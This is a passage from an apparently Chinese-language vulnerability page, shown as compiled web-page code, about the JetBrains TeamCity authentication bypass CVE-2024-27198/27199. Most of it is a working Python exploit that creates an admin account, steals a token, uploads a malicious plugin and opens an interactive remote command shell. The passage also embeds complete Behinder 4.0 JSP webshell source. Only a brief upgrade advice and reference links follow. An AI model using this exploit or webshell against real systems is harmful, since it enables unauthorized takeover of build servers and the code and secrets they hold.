        <span class="token keyword">return</span> token_info<span class="token punctuation">[</span><span class="token string">&quot;value&quot;</span><span class="token punctuation">]</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> err<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;[-] Failed to parse token XML response&quot;</span></span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] Error in func &lt;GetToken&gt;, error message: &quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">ParseArguments</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    banner <span class="token operator">=</span> <span class="token triple-quoted-string string">r&quot;&quot;&quot;
 _____                     ____ _ _           ____   ____ _____ 
|_   _|__  __ _ _ __ ___  / ___(_) |_ _   _  |  _ \\ / ___| ____|
  | |/ _ \\/ _\` | &#39;_ \` _ \\| |   | | __| | | | | |_) | |   |  _|  
  | |  __/ (_| | | | | | | |___| | |_| |_| | |  _ &lt;| |___| |___ 
  |_|\\___|\\__,_|_| |_| |_|\\____|_|\\__|\\__, | |_| \\_\\\\____|_____|
                                      |___/                     
                                                                            Author: @W01fh4cker
                                                                            Github: https://github.com/W01fh4cker
    &quot;&quot;&quot;</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>banner<span class="token punctuation">)</span>
    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>
        description<span class="token operator">=</span><span class="token string">&quot;CVE-2024-27198 &amp; CVE-2024-27199 Authentication Bypass --&gt; RCE in JetBrains TeamCity Pre-2023.11.4&quot;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-u&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--username&quot;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span>
                        <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;username you want to add. If left blank, it will be randomly generated.&quot;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-p&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--password&quot;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span>
                        <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;password you want to add. If left blank, it will be randomly generated.&quot;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-t&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--target&quot;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;target url&quot;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-d&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--domain&quot;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">&quot;example.com&quot;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;The domain name of the email address&quot;</span><span class="token punctuation">,</span>
                        required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-f&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--file&quot;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;The shell that you want to upload&quot;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;--proxy&quot;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;eg: http://127.0.0.1:8080&quot;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;--behinder4&quot;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;Upload the webshell of Behinder 4.0 [https://github.com/rebeyond/Behinder], the protocol is default_xor_base64&quot;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">&quot;store_true&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    args <span class="token operator">=</span> ParseArguments<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> args<span class="token punctuation">.</span>username<span class="token punctuation">:</span>
        username <span class="token operator">=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        username <span class="token operator">=</span> args<span class="token punctuation">.</span>username
    <span class="token keyword">if</span> <span class="token keyword">not</span> args<span class="token punctuation">.</span>password<span class="token punctuation">:</span>
        password <span class="token operator">=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        password <span class="token operator">=</span> args<span class="token punctuation">.</span>password
    <span class="token keyword">if</span> <span class="token keyword">not</span> args<span class="token punctuation">.</span>proxy<span class="token punctuation">:</span>
        proxy <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        proxy <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;http&quot;</span><span class="token punctuation">:</span> args<span class="token punctuation">.</span>proxy<span class="token punctuation">,</span>
            <span class="token string">&quot;https&quot;</span><span class="token punctuation">:</span> args<span class="token punctuation">.</span>proxy
        <span class="token punctuation">}</span>
    <span class="token keyword">if</span> args<span class="token punctuation">.</span><span class="token builtin">file</span><span class="token punctuation">:</span>
        shell_content <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">&quot;r&quot;</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">&quot;utf-8&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> args<span class="token punctuation">.</span>behinder4<span class="token punctuation">:</span>
        shell_content <span class="token operator">=</span> <span class="token triple-quoted-string string">r&quot;&quot;&quot;&lt;%@page import=&quot;java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*&quot; %&gt;
&lt;%!
private byte[] Decrypt(byte[] data) throws Exception
{
     byte[] decodebs;
        Class baseCls ;
                try{
                    baseCls=Class.forName(&quot;java.util.Base64&quot;);
                    Object Decoder=baseCls.getMethod(&quot;getDecoder&quot;, null).invoke(baseCls, null);
                    decodebs=(byte[]) Decoder.getClass().getMethod(&quot;decode&quot;, new Class[]{byte[].class}).invoke(Decoder, new Object[]{data});
                }
                catch (Throwable e)
                {
                    baseCls = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);
                    Object Decoder=baseCls.newInstance();
                    decodebs=(byte[]) Decoder.getClass().getMethod(&quot;decodeBuffer&quot;,new Class[]{String.class}).invoke(Decoder, new Object[]{new String(data)});

                }
    String key=&quot;e45e329feb5d925b&quot;;
	for (int i = 0; i &lt; decodebs.length; i++) {
		decodebs[i] = (byte) ((decodebs[i]) ^ (key.getBytes()[i + 1 &amp; 15]));
	}
	return decodebs;
}
%&gt;
&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return
        super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;)){
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            byte[] buf = new byte[512];
            int length=request.getInputStream().read(buf);
            while (length&gt;0)
            {
                byte[] data= Arrays.copyOfRange(buf,0,length);
                bos.write(data);
                length=request.getInputStream().read(buf);
            }
            out.clear();
            out=pageContext.pushBody();
        new U(this.getClass().getClassLoader()).g(Decrypt(bos.toByteArray())).newInstance().equals(pageContext);}
%&gt;&quot;&quot;&quot;</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        shell_content <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
    target <span class="token operator">=</span> args<span class="token punctuation">.</span>target<span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">)</span>
    teamcity_version <span class="token operator">=</span> GetTeamCityVersion<span class="token punctuation">(</span>target<span class="token punctuation">)</span>
    plugin_name <span class="token operator">=</span> GenerateRandomString<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
    user_id <span class="token operator">=</span> AddUser<span class="token punctuation">(</span>target<span class="token operator">=</span>target<span class="token punctuation">,</span> username<span class="token operator">=</span>username<span class="token punctuation">,</span> password<span class="token operator">=</span>password<span class="token punctuation">,</span> domain<span class="token operator">=</span>args<span class="token punctuation">.</span>domain<span class="token punctuation">)</span>
    token <span class="token operator">=</span> GetToken<span class="token punctuation">(</span>target<span class="token punctuation">,</span> user_id<span class="token punctuation">)</span>
    csrf_token <span class="token operator">=</span> GetCSRFToken<span class="token punctuation">(</span>target<span class="token punctuation">,</span> token<span class="token punctuation">)</span>
    session<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">&quot;X-TC-CSRF-Token&quot;</span><span class="token punctuation">:</span> csrf_token<span class="token punctuation">}</span><span class="token punctuation">)</span>
    os_version <span class="token operator">=</span> GetOSVersion<span class="token punctuation">(</span>target<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;[+] The target operating system version is </span><span class="token interpolation"><span class="token punctuation">{</span>GREEN<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>os_version<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>RESET<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">&quot;2023.11.&quot;</span> <span class="token keyword">in</span> teamcity_version<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&quot; &quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;[!] The current version is: </span><span class="token interpolation"><span class="token punctuation">{</span>teamcity_version<span class="token punctuation">}</span></span><span class="token string">. The official has deleted the /app/rest/debug/processes port. You can only upload a malicious plugin to upload webshell and cause RCE.&quot;</span></span><span class="token punctuation">)</span>
        continue_code <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;[!] The program will automatically upload the webshell ofbehinder3.0. You can also specify the file to be uploaded through the parameter -f. Do you wish to continue? (y/n)&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> continue_code<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">&quot;y&quot;</span><span class="token punctuation">:</span>
            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            GetEvilPluginZipFile<span class="token punctuation">(</span>shell_content<span class="token punctuation">,</span> plugin_name<span class="token punctuation">)</span>
            <span class="token keyword">if</span> UploadEvilPlugin<span class="token punctuation">(</span>target<span class="token punctuation">,</span> plugin_name<span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;[+] The malicious plugin </span><span class="token interpolation"><span class="token punctuation">{</span>GREEN<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>plugin_name<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>RESET<span class="token punctuation">}</span></span><span class="token string"> was successfully uploaded and is trying to be activated&quot;</span></span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> LoadEvilPlugin<span class="token punctuation">(</span>target<span class="token punctuation">,</span> plugin_name<span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">:</span>
                    shell_url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>target<span class="token punctuation">}</span></span><span class="token string">/plugins/</span><span class="token interpolation"><span class="token punctuation">{</span>plugin_name<span class="token punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">{</span>plugin_name<span class="token punctuation">}</span></span><span class="token string">.jsp&quot;</span></span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;[+] The malicious plugin </span><span class="token interpolation"><span class="token punctuation">{</span>GREEN<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>plugin_name<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>RESET<span class="token punctuation">}</span></span><span class="token string"> was successfully activated! Webshell url: </span><span class="token interpolation"><span class="token punctuation">{</span>GREEN<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>shell_url<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>RESET<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
                    <span class="token keyword">if</span> args<span class="token punctuation">.</span>behinder4<span class="token punctuation">:</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;[+] Behinder4.0 Custom headers: \\n</span><span class="token interpolation"><span class="token punctuation">{</span>GREEN<span class="token punctuation">}</span></span><span class="token string">X-TC-CSRF-Token: </span><span class="token interpolation"><span class="token punctuation">{</span>csrf_token<span class="token punctuation">}</span></span><span class="token string">\\nAuthorization: Bearer </span><span class="token interpolation"><span class="token punctuation">{</span>token<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>RESET<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;[+] Behinder4.0 transmission protocol: </span><span class="token interpolation"><span class="token punctuation">{</span>GREEN<span class="token punctuation">}</span></span><span class="token string">default_xor_base64</span><span class="token interpolation"><span class="token punctuation">{</span>RESET<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
                    <span class="token keyword">if</span> <span class="token keyword">not</span> args<span class="token punctuation">.</span><span class="token builtin">file</span> <span class="token keyword">and</span> <span class="token keyword">not</span> args<span class="token punctuation">.</span>behinder4<span class="token punctuation">:</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Please start executing commands freely! Type &lt;quit&gt; to end command execution&quot;</span><span class="token punctuation">)</span>
                        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
                            command <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>GREEN<span class="token punctuation">}</span></span><span class="token string">command &gt; </span><span class="token interpolation"><span class="token punctuation">{</span>RESET<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
                            <span class="token keyword">if</span> command <span class="token operator">==</span> <span class="token string">&quot;quit&quot;</span><span class="token punctuation">:</span>
                                sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
                            ExecuteCommandByEvilPlugin<span class="token punctuation">(</span>shell_url<span class="token punctuation">,</span> command<span class="token punctuation">,</span> token<span class="token punctuation">)</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;[-] Malicious plugin </span><span class="token interpolation"><span class="token punctuation">{</span>GREEN<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>plugin_name<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>RESET<span class="token punctuation">}</span></span><span class="token string"> activation failed&quot;</span></span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;[-] Malicious plugin </span><span class="token interpolation"><span class="token punctuation">{</span>GREEN<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>plugin_name<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>RESET<span class="token punctuation">}</span></span><span class="token string"> upload failed&quot;</span></span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Please start executing commands freely! Type &lt;quit&gt; to end command execution&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            command <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>GREEN<span class="token punctuation">}</span></span><span class="token string">command &gt; </span><span class="token interpolation"><span class="token punctuation">{</span>RESET<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> command <span class="token operator">==</span> <span class="token string">&quot;quit&quot;</span><span class="token punctuation">:</span>
                sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
            ExecuteCommandByDebugEndpoint<span class="token punctuation">(</span>target<span class="token punctuation">,</span> os_version<span class="token punctuation">,</span> command<span class="token punctuation">,</span> token<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞修复" tabindex="-1"><a class="header-anchor" href="#漏洞修复" aria-hidden="true">#</a> 漏洞修复</h2><h3 id="通用修补建议" tabindex="-1"><a class="header-anchor" href="#通用修补建议" aria-hidden="true">#</a> 通用修补建议</h3><p>根据 <code>影响版本</code> 中的信息，排查并升级到 <code>安全版本</code>，或直接访问参考链接获取官方更新指南。</p>`,4);function x(E,T){const a=o("ExternalLinkIcon");return i(),c("div",null,[u,r,k,d,n("ul",null,[n("li",null,[n("a",v,[s("https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/"),t(a)])]),n("li",null,[n("a",m,[s("https://github.com/yoryio/CVE-2024-27198"),t(a)])]),n("li",null,[n("a",b,[s("https://github.com/W01fh4cker/CVE-2024-27198-RCE"),t(a)])])]),g,n("p",null,[s("直接使用 